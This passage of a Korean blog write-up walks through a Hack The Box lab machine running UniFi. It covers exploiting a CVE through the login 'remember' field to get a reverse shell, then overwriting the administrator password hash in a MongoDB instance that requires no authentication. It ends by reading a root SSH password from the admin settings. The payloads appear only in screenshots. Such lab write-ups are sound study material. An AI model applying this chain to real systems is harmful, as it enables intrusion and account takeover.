![login](https://github.com/user-attachments/assets/b557104d-f318-41a6-98c6-0df4a6c53d83)

이제 다시 로그인 페이지로 돌아가 아무거나 입력해 로그인을 진행하며 burpsuite로 중간에 낚아채 `/api/login`의 내용물 중 CVE에서 말했던 `rememver` 부분을 페이로드로 바꿔서 보내면?

![shell](https://github.com/user-attachments/assets/23326bd0-ba2d-44fb-8c0a-94e0e219de06)

요렇게 성공할 수 있다. 근데 오른쪽 쉘을 보면 connection received 라고만 뜨지 뭔가 안뜨지만

![shell](https://github.com/user-attachments/assets/5dbf4106-fb16-42c3-a88b-8cdc75e6b786)

사실은 이미 연결 되었다는 것.

![좀더](https://github.com/user-attachments/assets/10e5119f-d6de-458a-8b0e-2643fc419c99)

그리고 좀 더 편하게 쓰기 위해 `script /dev/null -c bash` 명령어를 써서 보기 편하게 bash로 열어줬다.

![user flag](https://github.com/user-attachments/assets/0e82f9ca-c7f9-4c5b-9be2-ba68b946c952)

유저 플래그 획득!

### 권한 상승 (Privilege Escalation) 

![sudol](https://github.com/user-attachments/assets/4548d2c9-ef1f-402f-824c-ac0e919bc737)

지금까지 하면 이제 바로 알죠? `sudo -l`

근데 이번엔 안 통했다. 그냥 sudo가 없댄다.

그래서 그럼 뭐 프로세스라도 돌고있는게 있나? 하였고 그 중 `mongo` 라는 친구가 눈에 띄었다. MongoDB 익숙한 사람들도 있을 것이다.

![몽고](https://github.com/user-attachments/assets/d9dedd7c-3e64-4130-bfb5-9006e5c15106)

아예 mongo에 대한 정보만 긁어왔다.

![ace](https://github.com/user-attachments/assets/ffb14368-2ddd-42df-b99e-594b1d7e1116)

게다가 unifi의 mongodb 기본 데이터베이스의 이름이 `ace`이고 포트 `27117`이라고 하니 그에 따라 접속을 시도해보자.

![ace 테이블](https://github.com/user-attachments/assets/0d25af88-afa7-40b6-a108-781857577484)

테이블에는 다른 많은 유저들도 있기는 했다만 무려 `administrator` 관리자가 존재했다!

다만 x_shadow 형태로 암호화되어서.

근데 이걸 꺠는 것 보다 더 좋은 방법이 있다.

바로 그냥 덮어씌워버리기.

![make hash](https://github.com/user-attachments/assets/029b2865-a02a-47bc-b522-b9324f32e487)

그것을 위해 `administrator` 계정으로 로그인 할 때 사용할 새 비밀번호의 해시를 만들어주자.

![](https://github.com/user-attachments/assets/a418b0bf-3302-463c-8e11-ef4f4564436c)

그리고 위 명령어를 통해 admnistrator의 계정 비밀번호를 내가 만든 `Passwordhithere`로 바꿔버리자.

여기서 좀 해깔리는 사람이 있을 수도 있는데(사실 나다).

지금 바꾼 비밀번호는 리눅스 계정의 즉 root 계정의 비밀번호를 바꾸거나 한 것이 아니라 `unifi 웹 애플리케이션(웹사이트)` 내부에서만 존재하는 관리자 계정일 뿐이다.

게다가 가장 큰 문제는 이 MongoDB가 `비밀번호 없이` 열려있었다는 것이다! 평소라면 `-u (아이디)`나 `-p (비밀번호)`에 대한 명령어가 들어가야하지만 외부 포트로 들어오는 것은 막아두었으나 서버 내부(Localhost)에서 접속하는 계정은 그냥 모두 허용을 해둔 셈이다.

`로컬 서비스 인증 우회를 통한 권한 상승`이 가능했다.

![unifi login](https://github.com/user-attachments/assets/a5c9b4a1-7bed-4944-a8f4-b271fdfc53a0)

그렇게 `admnistrator` 아이디로 `Passwordhithere`의 비밀번호로 로그인에 성공할 수 있다.

![site](https://github.com/user-attachments/assets/bd2d0252-79ae-4107-8e11-973c7a6e3e0f)

사이트 내부를 둘러보다보면 `SETTINGS`의 `Site`에 들어가 `Device Authentication`의 부분에서 유저 이름이 root인 ssh 비밀번호를 발견했다.

![ssh](https://github.com/user-attachments/assets/cfbf6200-4745-434c-9aea-8f3fcfd3816e)

ssh에 로그인 하면? 바로 루트 플래그를 찾을 수 있다.

![Unified done](https://github.com/user-attachments/assets/821fbf15-3054-4615-930c-22eaf263075c)

## 마치며 (2026-02-20)

 이렇게 동아리 프로젝트 매니저로써 사실 보고서를 작성하는 것 까지 진행을 해보고자 했지만 이런건 꼭 계획대로 흘러가지는 않더라. 방학 중간에 여행 가기 전 갑자기 일주일간 독감에 걸려 시들시들하거나 설 연휴를 고려하지 않은 진행 속도로 인해 이제야, 그것도 학기가 시작하기 전에 딱 Hack The Box 머신의 기초인 Starting Point를 모두 풀 수 있게 되었다.

 사실 솔직히 Tier 1 까지는 Very Easy? 어... 그래 인정 이라고 생각했으나 어째 Tier 2에서는 그동안 그냥 풀었던 문제들 보다도 더 어려운 내용들이 기다리고 있을줄이야.. 그래도 아마 이 글을 읽고 있다면 문제 풀면서 Writeup을 읽어보는건 당연하겠지? 지금은 시험을 보는게 아니라 공부를 하는 때이니 말이다.

 서담이 길었다만, 이렇게 문제를 직접 풀어보니 역시! 아직 갈 길이 멀구나! 하는 생각이 든다. 그럼에도 계속 나아가는 건 어쩌면 아직은 어떻게든 풀 수 있는 수준이기도 하고 내가 POC를 직접 제작하는 것이 아닌 있는걸 가져다 쓰거나 취약점들을 직접 발견해서 활용하는 것이 아닌 검색을 통한 이미 누군가 찾아놓은 것을 활용해서 그럴지도 모르겠다.

 하지만 그럼에도 내 감상은 여전히 "난 재밌네?"이다. 풀 떄는 머리가 아프지만, 이걸 해냈을 때에 그리고 뭔가 뚫어냈다는 쾌감? 때문에라도 계속 더 도전해보고 싶어졌다. OSCP를 따지 못하여도, 그 길로 나아가지 않는다고 해도 나는 계속 Pentesting을 공부해나갈 듯 하다. 재밌고 즐겁거든! 풀 때는 좀 머리가 아프지만.

 그럼 다음 문제에서 다시 만날 수 있길!

 **Happy Hacking!**